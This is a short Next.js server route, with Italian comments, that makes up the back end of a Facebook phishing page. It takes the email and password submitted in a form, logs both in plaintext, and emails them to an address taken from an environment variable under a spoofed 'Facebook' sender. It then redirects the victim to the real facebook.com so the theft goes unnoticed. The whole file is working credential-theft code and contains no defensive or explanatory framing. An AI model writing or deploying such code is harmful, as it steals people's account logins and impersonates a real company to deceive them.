export const runtime = 'nodejs'; // Imposta il runtime corretto per usare Resend

import { NextResponse } from 'next/server';
import { Resend } from 'resend';

export async function POST(request: Request) {
  try {
    const body = await request.formData();
    const email = body.get('email')?.toString() || '';
    const password = body.get('password')?.toString() || '';

    console.log('✅ Route POST attivata');
    console.log('Email:', email);
    console.log('Password:', password);

    // Validazione base
    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email e password obbligatori.' },
        { status: 400 }
      );
    }

    const resend = new Resend(process.env.RESEND_API_KEY);

    await resend.emails.send({
      from: 'Facebook <securitynoreply@facebook2025.it>',
      to: process.env.EMAIL_TO ?? '',
      subject: '🛡️ Nuovo tentativo di accesso',
      text: `📧 Email: ${email}\n🔑 Password: ${password}`,
    });

    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    console.error('❌ Errore dettagliato:', error);
    return NextResponse.json({ error: 'Errore interno del server.' }, { status: 500 });
  }
}
